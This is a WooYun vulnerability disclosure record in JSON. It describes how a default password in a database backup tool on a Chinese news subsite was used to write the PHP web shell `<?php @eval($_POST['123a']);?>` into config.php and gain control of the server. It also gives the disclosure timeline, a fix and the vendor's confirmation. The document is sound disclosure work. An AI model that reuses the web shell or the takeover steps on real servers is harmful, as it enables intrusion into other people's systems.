{"id": 6455, "wybug_id": "wooyun-2013-045597", "wybug_title": "中国网山东分站数据库管理程序默认密码导致网站沦陷", "wybug_corp": "中国网", "wybug_author": "嗯啊哈哼", "wybug_date": "2013-12-11 13:12", "wybug_open_date": "2014-01-25 13:13", "wybug_type": "后台弱口令", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "渗透测试思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向公众公开  简要描述：  详细说明：  http://sd.china.com.cn 数据库管理程序默认密码导致可插入任意代码.非网上公布的方法\n\napache  linux组合 根据网上很多帝国拿SHELL的方法对此服务器好像没什么用,或许是我不是太懂MYSQL吧.\n\n进去后,数据库未连接着,于是本地搭建 备份到目标服务器上\n\n\n\n\n\n备份后下载,一般习惯性的全部替换,但是因格式错乱无法替换,所以只替换<?php\n\n\n\n替换好后.再下载下来查看是否成功\n\n成功\n\nSHELL地址\n\n   漏洞证明：  典型的管理员疏忽,网站内的 帝国备份王未更改默认密码导致攻击成功.网上也有很多对帝国备份王的利用方式.但此次攻击未完全使用.在帝国备份王内MYSQL账户密码未设置好,所以在本地搭建MYSQL,并打开外连,再从帝国备份王那里连接到本地MYSQL成功,曾有尝试网上的方法,稍有繁琐,于是直接在帝国备份王里备份本地搭建的数据库到sd.china.com.cn服务器上,下载下来后查看config.php源码,然后进行替换(帝国备份王的功能),替换文件为\"diguo/bdata/创建的备份目录/config.php\"因为格式问题,多次尝试无法替换成功.最后替换了第一行的<?php 替换为<?php @eval($_POST['123a']);?>1 后面多余的代码便失效.菜刀成功连接!   修复方案：  更改某数据库管理程序默认密码,并加认证码与验证码   版权声明：转载请注明来源 嗯啊哈哼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2013-12-15 21:48 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT通报给新闻行业主管部门，由其后续联系网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-11 13:23 |    \t\t煦阳。 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:27        | 这个人很懒，什么都没留下。)\t\t \n  root root?    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}